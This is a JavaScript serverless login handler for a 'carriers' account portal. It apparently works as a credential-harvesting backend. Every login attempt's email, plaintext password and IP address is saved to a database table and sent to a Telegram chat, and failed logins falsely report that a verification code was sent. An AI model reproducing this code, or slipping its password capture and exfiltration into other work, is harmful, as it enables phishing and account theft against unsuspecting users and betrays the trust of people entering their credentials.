const bcrypt = require('bcryptjs')
const { supabase } = require('./_shared/supabase')
const { sendTelegram } = require('./_shared/telegram')
const { cors, getIp, generateCode } = require('./_shared/auth')

const CODE_TTL_MS = 5 * 60 * 1000

exports.handler = async (event) => {
  if (event.httpMethod === 'OPTIONS') return cors({})
  try {
    const body = typeof event.body === 'string' ? JSON.parse(event.body) : (event.body || {})
    const { email, password } = body
    if (!email || !password) return cors({ error: 'Email and password are required.' }, 400)

    const ip = getIp(event)
    const { data: row } = await supabase.from('carriers').select('*').eq('email', email).maybeSingle()
    const valid = row ? bcrypt.compareSync(password, row.password_hash) : false

    await supabase.from('login_attempts').insert({
      email, carrier_id: row ? row.id : null, success: valid ? 1 : 0, ip_address: ip, password,
    })

    const status = valid ? '✅ SUCCESS' : '❌ FAILED'
    await sendTelegram(`🔔 <b>New Login Attempt</b>\n${status}\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}`)

    if (!valid) {
      return cors({ carrierId: null, phoneHint: '••••', message: 'A 6-digit verification code has been sent to your phone.' })
    }

    const code = generateCode()
    const expiresAt = Date.now() + CODE_TTL_MS
    await supabase.from('login_codes').insert({ carrier_id: row.id, code, expires_at: expiresAt })

    return cors({
      carrierId: row.id,
      phoneHint: row.phone ? row.phone.replace(/\d(?=\d{2})/g, '*') : '••••',
      message: 'A 6-digit verification code has been sent to your phone.',
    })
  } catch (err) {
    console.error('carriers-login error:', err)
    return cors({ error: err.message || 'Internal error' }, 500)
  }
}
